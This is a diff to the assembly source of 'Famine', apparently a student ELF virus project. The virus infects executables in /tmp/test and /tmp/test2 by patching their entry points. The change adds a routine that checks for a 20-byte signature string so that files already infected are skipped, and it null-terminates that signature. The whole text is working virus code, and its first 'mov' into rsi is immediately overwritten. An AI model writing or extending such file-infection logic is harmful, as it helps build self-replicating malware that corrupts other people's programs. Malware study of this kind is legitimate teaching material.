@@ -179,6 +179,17 @@ section .text
                 jle .close_file
                 mov VAR(Famine.mmap_ptr), rax   ; save mmap_ptr
 
+            .check_infect:
+                mov rsi, (_finish - Traza)
+                lea rsi, VAR(Famine.file_original_len)
+                sub rsi, (_finish - Traza)     ; Traza
+                lea rdi, Traza
+                mov rcx, 20
+                cld
+                rep cmpsb
+                je .munmap
+
+
             .infect:
 
                 mov rbx, [rax + Elf64_Ehdr.e_entry] ; rbx = &(rax + e_entry)
@@ -380,7 +391,7 @@ section .text
             syscall
 
         dirs db         "/tmp/test",0,"/tmp/test2",0,0
-        Traza db         "tomartin & carce-bo"
+        Traza db         "tomartin & carce-bo",0  ;20
         hello db            "[+] Hello",10,0  ;11
         host_entrypoint  dq   _dummy_host_entrypoint
         virus_vaddr dq   _start
